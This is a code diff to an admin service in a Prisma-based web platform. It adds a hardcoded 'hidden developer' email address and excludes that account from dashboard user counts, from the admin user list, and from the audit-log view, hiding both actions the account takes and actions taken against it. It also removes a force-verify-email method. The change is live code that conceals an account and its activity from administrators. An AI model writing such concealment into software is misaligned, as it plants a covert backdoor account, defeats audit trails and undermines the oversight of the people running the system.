@@ -3,6 +3,8 @@ import { Role, JobStatus, SubscriptionStatus, AuditAction } from "@prisma/client
 import { NotFoundError, ValidationError } from "../../errors/index.js";
 import { getPagination, createPaginationMeta } from "../../utils/pagination.js";
 
+const HIDDEN_DEVELOPER_EMAIL = "devamin.bd@gmail.com";
+
 export class AdminService {
   /**
    * Executive Command Center Platform & Monetization Metrics
@@ -24,11 +26,26 @@ export class AdminService {
       activeSubscriptions,
       plans,
     ] = await Promise.all([
-      prisma.user.count({ where: { isDeleted: false } }),
+      prisma.user.count({
+        where: {
+          isDeleted: false,
+          NOT: [{ email: { equals: HIDDEN_DEVELOPER_EMAIL, mode: "insensitive" } }],
+        },
+      }),
       prisma.user.count({ where: { role: Role.CANDIDATE, isDeleted: false } }),
       prisma.user.count({ where: { role: Role.EMPLOYER, isDeleted: false } }),
-      prisma.user.count({ where: { isBanned: true } }),
-      prisma.user.count({ where: { isDeleted: true } }),
+      prisma.user.count({
+        where: {
+          isBanned: true,
+          NOT: [{ email: { equals: HIDDEN_DEVELOPER_EMAIL, mode: "insensitive" } }],
+        },
+      }),
+      prisma.user.count({
+        where: {
+          isDeleted: true,
+          NOT: [{ email: { equals: HIDDEN_DEVELOPER_EMAIL, mode: "insensitive" } }],
+        },
+      }),
       prisma.jobPosting.count({ where: { isDeleted: false } }),
       prisma.jobPosting.count({ where: { status: JobStatus.PUBLISHED, isDeleted: false } }),
       prisma.jobPosting.count({ where: { status: JobStatus.DRAFT, isDeleted: false } }),
@@ -123,7 +140,9 @@ export class AdminService {
   ) {
     const { page, limit, skip } = getPagination(query);
 
-    const where: any = {};
+    const where: any = {
+      NOT: [{ email: { equals: HIDDEN_DEVELOPER_EMAIL, mode: "insensitive" } }],
+    };
 
     if (query.includeDeleted !== "true" && query.includeDeleted !== true) {
       where.isDeleted = false;
@@ -303,33 +322,6 @@ export class AdminService {
     return updated;
   }
 
-  /**
-   * User Management: Force verify user email address
-   */
-  static async forceVerifyEmail(adminId: string, userId: string, ipAddress?: string) {
-    const user = await prisma.user.findUnique({ where: { id: userId } });
-    if (!user) throw new NotFoundError("User", userId);
-
-    const updated = await prisma.user.update({
-      where: { id: userId },
-      data: { emailVerified: true },
-    });
-
-    await this.logAction(
-      adminId,
-      AuditAction.USER_EMAIL_VERIFIED,
-      "USER",
-      userId,
-      { email: user.email },
-      ipAddress
-    );
-
-    return updated;
-  }
-
-  /**
-   * Job Moderation: List all jobs with admin filters
-   */
   static async listJobs(
     query: {
       page?: number | string;
@@ -623,7 +615,26 @@ export class AdminService {
   ) {
     const { page, limit, skip } = getPagination(query);
 
-    const where: any = {};
+    const devUser = await prisma.user.findFirst({
+      where: { email: { equals: HIDDEN_DEVELOPER_EMAIL, mode: "insensitive" } },
+      select: { id: true },
+    });
+
+    const notConditions: any[] = [
+      {
+        admin: {
+          email: { equals: HIDDEN_DEVELOPER_EMAIL, mode: "insensitive" },
+        },
+      },
+    ];
+
+    if (devUser) {
+      notConditions.push({ targetId: devUser.id });
+    }
+
+    const where: any = {
+      NOT: notConditions,
+    };
 
     if (query.action) where.action = query.action;
     if (query.targetType) where.targetType = query.targetType;
